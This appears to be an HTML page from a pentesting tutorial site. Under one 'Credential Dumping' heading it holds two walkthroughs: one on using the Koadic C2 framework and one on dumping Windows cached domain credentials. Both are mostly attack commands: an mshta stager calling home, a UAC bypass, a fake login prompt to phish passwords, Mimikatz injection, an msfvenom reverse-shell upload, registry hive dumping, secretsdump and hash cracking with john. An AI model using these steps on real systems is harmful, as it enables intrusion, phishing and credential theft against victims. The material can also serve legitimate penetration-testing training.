@@ -1,0 +1,281 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: hidden;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1020px;
+        position: scroll;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: scroll;
+        overflow-y: scroll;
+        padding-top: 0px;
+    }
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 28px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">【🖳Port Forwarding & Tunnelling🛠️👨🏽‍💻】</a>
+  <a href="2.html">【🖳Comprehensive Guide on HTML Smuggling🛠️👨🏽‍💻】</a>
+  <a href="3.html">【🖳Credential Dumping: Domain Cache Credential🛠️👨🏽‍💻】</a>
+  <a href="4.html">【🖳Comprehensive Guide on Password Spraying Attack🛠️👨🏽‍💻】</a>
+ <a href="5.html">【🖳A Detailed Guide on Hydra Tool🛠️👨🏽‍💻】</a>
+  <a href="6.html">【🖳A Detailed Guide on Medusa Tool🛠️👨🏽‍💻】</a>
+  <a href="7.html">【🖳Comprehensive Guide on Local & Remote File Inclusion🛠️👨🏽‍💻】</a>
+<a href="8.html">【🖳Netcat for Pentesting🛠️👨🏽‍💻】</a>
+  <a href="9.html">【🖳Comprehensive Guide on Dirbuster & BurpSuite Spider Tools🛠️👨🏽‍💻】</a>
+  <a href="10.html">【🖳Comprehensive Encoding Guide🛠️👨🏽‍💻】</a>
+ <p align="center"><img src="https://i.ibb.co/yyQbWbC/net.png" height="90" width="200"></p> 
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h3 class="heading-element" dir="auto" tabindex="-1"><p align="left">🖳Credential Dumping: Domain Cache Credential🛠️</p></h3>
+<h5 class="post-title entry-title">Koadic &ndash; COM Command &amp; Control Framework</h5>
+<div class="post-date">
+<div class="entry-meta">In this guide, we are introducing another most interesting tool &ldquo;KOADIC &ndash; COM Command &amp; Control&rdquo; tool which is quite similar to Metasploit and Powershell Empire. So let&rsquo;s began with its tutorial and check its functionality.</div>
+</div>
+<div class="content post-excerpt entry-content clearfix">
+<h3>Contents</h3>
+<ul>
+<li>Introduction to Koadic</li>
+<li>Installation of Koadic</li>
+<li>Usage of Koaidc</li>
+<li>Koadic Stagers</li>
+<li>Privilege Escalation with Koadic Implants</li>
+<li>post Exploitation
+<ul>
+<li>Generate Fake Login Prompt</li>
+<li>Enable Rdesktop</li>
+<li>Inject Mimikatz</li>
+<li>Execute Command</li>
+<li>Obtain Meterpreter Session from Zombie Session</li>
+</ul>
+</li>
+</ul>
+<h3>Introduction to Koadic</h3>
+<p>Koadic, or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.</p>
+<p>It is possible to serve payloads completely in memory from stage 0 to beyond, as well as use cryptographically secure communications over SSL and TLS (depending on what the victim OS has enabled).</p>
+<p>Koadic also attempts to be compatible with both Python 2 and Python 3. However, as Python 2 will be going out the door in the not-too-distant future, we recommend using Python 3 for the best experience.</p>
+<p><em>Source &ndash; //github.com/zerosum0x0/koadic</em></p>
+<h3>Installation of Koadic</h3>
+<p>It must first be downloaded and installed in order to start using Koadic. Run the following command to download Koadic from github and also take care of its dependency tools while installing koadic.</p>
+<pre class="lang:default decode:true ">git clone https://github.com/zerosum0x0/koadic.git
+cd koadic</pre>
+&nbsp;
+<pre class="lang:default decode:true">apt-get install python3-pip
+pip3 install -r requirements.txt
+./koadic</pre>
+<p><img src="https://2.bp.blogspot.com/-bjAlpze9ESg/XD9FoYHShWI/AAAAAAAAcGQ/BRKMFOVva10g_V3P8kgXje-5uO4p-GA9wCLcBGAs/s1600/1.png" alt="" /></p>
+<h3>Usage of Koaidc</h3>
+<p>This tool majorly depends upon stager and implant. It contains 6 stager and 41 implants.</p>
+<p><strong>Stager:</strong>&nbsp;Stagers hook target zombies and allow you to use implants.</p>
+<p><strong>Implants:</strong>&nbsp;Implants start jobs on zombies.</p>
+<p>Once installation gets completed, you can run&nbsp;<strong>./koadic</strong>&nbsp;file to start koadic. Then run the most helpful command to get the synopsis of the use of koadic. The help command summarizes the various commands available. Koadic functions are similar to other frameworks, such as Metasploit.</p>
+<p><img src="https://4.bp.blogspot.com/-tcLJ2SfJL2I/XD9Fq3a_hSI/AAAAAAAAcG0/h7Unh0ZQA5UlKVJexpeG2KuYex06ubcGQCLcBGAs/s1600/2.png" alt="" /></p>
+<p>To load all available module in the terminal run &ldquo;<strong><em>use &lt;tab&gt; &lt;tab&gt;&rdquo;</em></strong>&nbsp;command. This will dump all available implant and stagers for execution or explore stager module with following commands:</p>
+<pre class="lang:default decode:true">use stager/js/</pre>
+<p>This will give you all stagers that will be useful for getting zombie session of the target machine.</p>
+<p><img src="https://2.bp.blogspot.com/-oaNfUQl-DFM/XD9FrYRVQvI/AAAAAAAAcG4/wl31WXzMYhoK_uYCC4qa8vMU5sZDYB9WACLcBGAs/s1600/3.png" alt="" /></p>
+<h3>Koadic Stagers</h3>
+<p>The stager enables us to describe where any zombie device accesses the Koadic command and control. Some of these settings can be viewed by running info command once the module is selected. Let&rsquo;s start with loading the&nbsp;<strong>mshta stager</strong>&nbsp;by running the following command.</p>
+<p>Set SRVHOST where the stager should call home and SRVPORT the port to listen for stagers on or even you can set ENDPOINT for the malicious file name and then enter run to execute.</p>
+<pre class="lang:default decode:true">set SRVHOST 192.168.1.107
+set ENDPOINT sales
+run</pre>
+<p><img src="https://3.bp.blogspot.com/-bM2mHEBZTMI/XD9FrnvgNJI/AAAAAAAAcG8/wOhp_lQV-aon6X6n4JX5QqaoP5WHZ0qyACLcBGAs/s1600/4.png" alt="" /></p>
+<p>&nbsp;Now run below command to execute the above generated malicious file.</p>
+<pre class="lang:default decode:true">mshta //192.168.1.107:9999/sales</pre>
+<p><img src="https://4.bp.blogspot.com/-uwUX9P0H3gw/XD9Fr0lBPsI/AAAAAAAAcHA/ySeULZCj2t4Viat4DBvzFhrsAIluw_jYACLcBGAs/s1600/5.png" alt="" /></p>
+<p>Once the malicious sales file will get executed on the target machine, you will have a&nbsp;<strong>Zombie connection</strong>&nbsp;just like metasploit.</p>
+<pre class="lang:default decode:true">zombies 0</pre>
+<p><img src="https://1.bp.blogspot.com/-EL0cu7Srrt8/XD9FsInmKPI/AAAAAAAAcHE/Yhod21obhwIkEXeLtlTUMltWsKKP_ckGQCLcBGAs/s1600/6.png" alt="" /></p>
+<h3>Privilege Escalation with Koadic Implants</h3>
+<p>Once you have zombie session after than you can use implant modules for privilege escalation that includes bypass UAC.</p>
+<p>Koadic contains all modules to bypass UAC of Windows 7, 8, 10 platform so that you can extract system level information. We can load this module by running the command below within Koadic.</p>
+<pre class="lang:default decode:true">use implant/elevate/bypassuac_eventvwr</pre>
+<p>Then, we will set the payload value to run the module. You can use default zombie value as &ldquo;ALL&rdquo; to attack all zombies or can set the particular zombie id you want to attack. Use the command below to adjust the payload value and zombie.</p>
+<pre class="lang:default decode:true">set PAYLOAD 0
+set ZOMBIE 0
+run</pre>
+<p><img src="https://2.bp.blogspot.com/-3uuMHOodKk0/XD9FssApLBI/AAAAAAAAcHI/NpOvATCydeIy3_0b84jcPddT-D76A88xgCLcBGAs/s1600/7.png" alt="" /></p>
+<h3>post Exploitation</h3>
+<h3>Generate Fake Login Prompt</h3>
+<p>You can start a phishing attack with koadic and track the victim&rsquo;s login credentials. We can load this module by running the command below within Koadic.</p>
+<pre class="lang:default decode:true">use implant/phish/password_box
+set ZOMBIE 1
+run</pre>
+<p><img src="https://3.bp.blogspot.com/-CT7l6zJyNOM/XD9Fs26uQ8I/AAAAAAAAcHQ/xfMOe6IdFz0bCOXx5DJ9yxvuyEp1F-NpgCLcBGAs/s1600/8.png" alt="" /></p>
+<p>This will launch a Prompt screen for login at the victim&rsquo;s machine.</p>
+<p><img src="https://2.bp.blogspot.com/-91QVn8sd4BA/XD9Fs5u8cBI/AAAAAAAAcHM/lW2FvhOYWf0VX3qRNWcRQOwjso1wd7U2gCLcBGAs/s1600/9.png" alt="" /></p>
+<p>Therefore, if the victim enters his password in a fake prompt, you get the password in the command and control shell of Koadic.</p>
+<p><img src="https://2.bp.blogspot.com/-D-yusrDbS9o/XD9FoRboCvI/AAAAAAAAcGU/m3FsqqGHRa8m3f2udotuYtolQKVMQaVpwCLcBGAs/s1600/10.png" alt="" /></p>
+<h3>Enable Rdesktop</h3>
+<p>Just like metasploit, here also you can enable remote desktop service in the victim&rsquo;s machine with the following implant module.</p>
+<pre class="lang:default decode:true">use implant/manage/enable_rdesktop
+set ZOMBIE 1
+run</pre>
+<p>As you can observe in the below image that job 4 is completed successfully and it has enabled rdesktop service.</p>
+<p><img src="https://3.bp.blogspot.com/-PhLRIIhPQ_A/XD9FoRaKkWI/AAAAAAAAcGM/UtD6H8QGA5QqX6wAP_lKMqrtmeXeddFggCLcBGAs/s1600/11.png" alt="" /></p>
+<p>We can ensure for rdesktop service with the help of nmap to identify state for port 3389.</p>
+<pre class="lang:default decode:true">nmap -p3389 192.168.1.103</pre>
+<p>Hmm!! So you can observe from nmap result we found port 3389 is open which means&nbsp;<strong>rdesktop</strong>&nbsp;service is enabled.</p>
+<p><img src="https://2.bp.blogspot.com/-gds6RBQavBQ/XD9Fo33HUCI/AAAAAAAAcGY/sm0LPZwMhRQsdn4RyygamJagNX9L-tlrgCLcBGAs/s1600/12.png" alt="" /></p>
+<h3>Inject Mimikatz</h3>
+<p>It will let you inject mimikatz in victim&rsquo;s machine for extracting the password from inside the machine. We can load this module by running the command below within Koadic.</p>
+<pre class="lang:default decode:true">use implant/inject/mimikatz_dotnet2js
+set ZOMBIE 1
+run</pre>
+<p>As result, it will dump the&nbsp;<strong>NTLM hash</strong>&nbsp;password which we need to crack. Save the NTLM value in a text file.</p>
+<p><img src="https://3.bp.blogspot.com/-xqtm2sGcKuw/XD9FpepQoCI/AAAAAAAAcGg/RtWy8eRhauA1IJIgjQe9OvYLWBgNmzevACLcBGAs/s1600/13.png" alt="" /></p>
+<p>Then we will use john the ripper for cracking hash value, therefore run following command along with the hash file as shown below:</p>
+<pre class="lang:default decode:true">john hash --format=NT</pre>
+<p>As you can observe that it has shown 123 as the password extracted from the hash file.</p>
+<p><img src="https://2.bp.blogspot.com/-8smxnKE86g8/XD9FpCFtH6I/AAAAAAAAcGc/sQnP25jOadkzK33YKklT2qg134-nVXV6gCLcBGAs/s1600/14.png" alt="" /></p>
+<h3>Execute Command</h3>
+<p>Since we high privileged shell, therefore, we are free to run any implant module for post exploitation, and now we are using exec_cmd to execute any command on the Windows system. To load this implant, run the command given below.</p>
+<pre class="lang:default decode:true">use implant/manage/exec_cmd</pre>
+<p>Then, we will set the CMD value to run the specified command along with Zombie id.</p>
+<pre class="lang:default decode:true">set CMD ipconfig
+set ZOMBIE 1
+run</pre>
+<p><img src="https://2.bp.blogspot.com/--T0ZJ-ExcZo/XD9Fp4GSIQI/AAAAAAAAcGk/M7Yxt42mdWInoGndaVu1FYx1Wtoauxa_QCLcBGAs/s1600/15.png" alt="" /></p>
+<h3>Obtain Meterprter Session from Zombie Session</h3>
+<p>If you are having zombie session then you can get meterpreter session through it. Generate a malicious file with the help of msfvenom and start multi handle, as we always do in metasploit.</p>
+<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f exe &gt; shell.exe</pre>
+<p><img src="https://2.bp.blogspot.com/-tsHMm2C3qd0/XD9FqLVjkZI/AAAAAAAAcGo/W04uIdD_oME45EvG6Lm-pL9lUQb9FbZYQCLcBGAs/s1600/16.png" alt="" /></p>
+<p>Koadic provides an implant module that allows you to upload any file inside the machine of the victim if you have zombie sessions. To load this implant, run the following command:</p>
+<pre class="lang:default decode:true">use implant/util/upload_file</pre>
+<p>Now set the file location and Zombie Id then run the module. This will upload your malicious in writable directory i.e. %TEMP%.</p>
+<pre class="lang:default decode:true ">set LFILE /root/shell.exe
+set ZOMBIE 1
+run</pre>
+<p>Once the job is completed then again use exec_cmd to run the uploaded file with the help of this module.</p>
+<pre class="lang:default decode:true">use implant/manage/exec_cmd</pre>
+<p>Then, we will set the CMD value to run the uploaded shell.exe file along with Zombie id.</p>
+<pre class="lang:default decode:true">set CMD %TEMP%/shell.exe
+set ZOMBIE 1
+run</pre>
+<p><img src="https://2.bp.blogspot.com/-nagdgoSZ50k/XD9FqDjN2-I/AAAAAAAAcGs/p4ktuLKpHXcgTqkx6xA2GpLX_uXgS3GRQCLcBGAs/s1600/17.png" alt="" /></p>
+<p>Once you will execute the malicious exe file within Koadic zombie session, you will get a meterpreter session in the metasploit framework as shown below:</p>
+<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set rhost IP 192.168.1.107
+msf exploit(handler) &gt; set lport 1234
+msf exploit(handler) &gt; exploit</pre>
+<p>Once the file is executed on the machine we will get the victim machine meterpreter session as shown below:</p>
+<p><img src="https://1.bp.blogspot.com/-tLFPdzUBf10/XD9Fq_eIqeI/AAAAAAAAcGw/okDey8ahhGQQBTx_0kvASTiy7Vk8KEgawCLcBGAs/s1600/18.png" alt="" /></p>
+</div>
+<h1 class="post-title entry-title">Credential Dumping: Domain Cache Credential</h1>
+<div class="content post-excerpt entry-content clearfix">
+<p>In this guide, we are going to discuss the domain cache credential attack and various technique to extract the password hashes by exploiting domain user.</p>
+<h3><strong>Contents</strong></h3>
+<ul>
+<li>Domain Cache credential</li>
+<li>Metasploit</li>
+<li>Impacket</li>
+<li>Mimikatz</li>
+<li>PowerShell Empire</li>
+<li>Koadic</li>
+<li>Python Script</li>
+</ul>
+<h3><strong>Domain Cache credential (DCC2)</strong></h3>
+<p>Microsoft Windows stores previous users&rsquo; logon information locally so that they can log on if a logon server is unreachable during later logon attempts. This is known as&nbsp;<strong>Domain Cache credential</strong>&nbsp;(DCC) but in-actually it is also known as&nbsp;<strong>MSCACHE</strong>&nbsp;or&nbsp;<strong>MSCASH&nbsp;</strong>hash. It sorted the hash of the user&rsquo;s password that you can&rsquo;t perform pass-the-hash attacks with this type of hash. It uses MSCACHE algorithm for generating password hash and that are stored locally in the Windows registry of Windows operating system. These hashes are stored in the Windows registry, by default the last 10 hashes.</p>
+<p>There two versions of MSCASH/MSCACHE or DCC</p>
+<ul>
+<li>MSCACHEV1 or DCC1 used before Vista Server 2003</li>
+<li>MSCACHEV2 or DCC2 used after Vista &amp; Server 2003</li>
+</ul>
+<h3><u>Walkthrough</u></h3>
+<h3><strong>Metasploit</strong></h3>
+<p>Metasploit helps the pen tester to extract the stored hashes by exploit registry for MSCACHE stored hashes. This module uses the registry to extract the stored domain hashes that have been cached as a result of a GPO setting. The default setting on Windows is to store the last ten successful logins.</p>
+<pre class="lang:default decode:true">use post/windows/gather/cachedump
+set session 2
+exploit</pre>
+<p>As a result it will dump the password hashes, and these fetched from inside DCC2/MSCACHE as shown in the image given below.</p>
+<p><img src="https://1.bp.blogspot.com/-AhgTnlmegXc/XuSyYwIGGzI/AAAAAAAAku0/rYO582w7nXo77u10U72m35y9plx9D28MwCLcBGAsYHQ/s1600/1.png" alt="" /></p>
+<h3><strong>Impacket</strong></h3>
+<p>This hash can be extracted using python impacket libraries, this required system and security files stored inside the registry. With the help of the following command, you can pull out these files from the registry and save on your local machine.</p>
+<pre class="lang:default decode:true">reg save hklm\system c:\system
+reg save hklm\security&nbsp;c:\secuirty</pre>
+<p><img src="https://1.bp.blogspot.com/-kzPuFpHZdL0/XuSyZn9MS2I/AAAAAAAAku8/IqtKZdKibYUYZ1ySSNcNcMATuoJUBNt4wCLcBGAsYHQ/s1600/2.png" alt="" /></p>
+<p>Further copy the system and security file on that platform where impacket is installed, in our case we copied it inside kali Linux and use the following for extracting DCC2/MSCACHE hashes.</p>
+<pre class="lang:default decode:true">python secretsdump.py -security -system system LOCAL</pre>
+<p>Boom!!!! You will get the DCC2/MSCACHEv2 hashes on your screen.</p>
+<p><img src="https://1.bp.blogspot.com/-h8zslH_Swbg/XuSyaGBVy7I/AAAAAAAAkvA/u-xhcFPOQ0Mo9PH12g1ttvck6qbDlKr0QCLcBGAsYHQ/s1600/3.png" alt="" /></p>
+<h3><strong>Mimikatz</strong></h3>
+<p>As we all know, mimikatz is one of the best penetration testing tools for credential dumping windows. So, we can get DCC2 / MSCACHEv2 hashes using mimikatz by installing it on a compromised host and executing the following command:</p>
+<pre class="lang:default decode:true">privilege::debug
+token::elevate
+lsadump::cache</pre>
+<p>And again, you will get the MSCACHEv2 hashes on your screen.</p>
+<p><img src="https://1.bp.blogspot.com/-bwIOkh6xUHk/XuSyaKBlaPI/AAAAAAAAkvE/D9ZgvPwOtoYQMqbtT7JYHm8bMDke_D8GACLcBGAsYHQ/s1600/4.png" alt="" /></p>
+<h3><strong>PowerShell Empire</strong></h3>
+<p>Moving to our next technique, PowerShell Empire has a module that extracts the MSCACHEV2 hashes from the inside registry of the compromised machine. So, download and run Empire on your local machine and compromise the host machine once to use the empire post module and then type as follows:</p>
+<pre class="lang:default decode:true">usemodule credentails/mimikatz/cache
+set agent &lt;agent_id&gt;
+execute</pre>
+<p>And again, you will get the MSCACHEv2 hashes on your screen.</p>
+<p><strong><img src="https://1.bp.blogspot.com/-Kf3MEOhWOvc/XuSyamfYrCI/AAAAAAAAkvI/UhbXYHyyAj4JOm_x9xE-26U50ipZ93-XQCLcBGAsYHQ/s1600/5.png" alt="" /></strong></p>
+<h3><strong>Koadic</strong></h3>
+<p>Just like the Powershell empire, you can use koadic to extract the DCC2 hashes. Run following module to hashes:</p>
+<pre class="lang:default decode:true">use mimikatz_dotnet2js
+set MIMICMD lsadump::cache</pre>
+<p>And again, you will get the MSCACHEv2 hashes on your screen.</p>
+<p><strong><img src="https://1.bp.blogspot.com/-Abr5bYgjl1I/XuSybKrONUI/AAAAAAAAkvM/HlgSaZwhgS8rojkX4VZwIngLXm28KdF2wCLcBGAsYHQ/s1600/8.png" alt="" /></strong></p>
+<h3><strong>Python Script</strong></h3>
+<p>Just like impacket, you can download the MSCACHEV2 python script to extract the stored hashes. Download the script from&nbsp;<strong>github&nbsp;</strong>and then use security and system files&nbsp; (As discussed in Impacted)</p>
+<pre class="lang:default decode:true ">python mscache.py --security /root/Desktop/security &ndash;system /root/Desktop/system</pre>
+<p>And again, you will get the MSCACHEv2 hashes on your screen.</p>
+<p><img src="https://1.bp.blogspot.com/-hDLJ7GvbDNo/XuSyZJQNqyI/AAAAAAAAku4/lKib38rwkxAmBsgKBnVQ19rZDs4M1cKHgCLcBGAsYHQ/s1600/10.png" alt="" /></p>
+<h3><strong>Cracking DCC2 or MACHACHE2/MSCASH2</strong></h3>
+<p>As we know these hashes are not used in PASS The Hash attack, thus we need to use john the ripper to crack these hashes for utilising it.</p>
+<pre class="lang:default decode:true">john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt mhash</pre>
+<p>As a result, it has dumped the password in clear text for the given hash file. Hence don&rsquo;t get confused between DCC2 or MSCACHEV2/MSCASH hash these all are same and you can use the above-discussed the method to extract them.</p>
+<p><img src="https://1.bp.blogspot.com/-8u9t4Da302w/XuSyY4bUURI/AAAAAAAAkuw/SKf0I_5_eSc7WbtOZswjFL0IP3fQUkvsQCLcBGAsYHQ/s1600/11.png" alt="" /></p>
+</div>
+</div>
+</div>
+</body>
+</html>
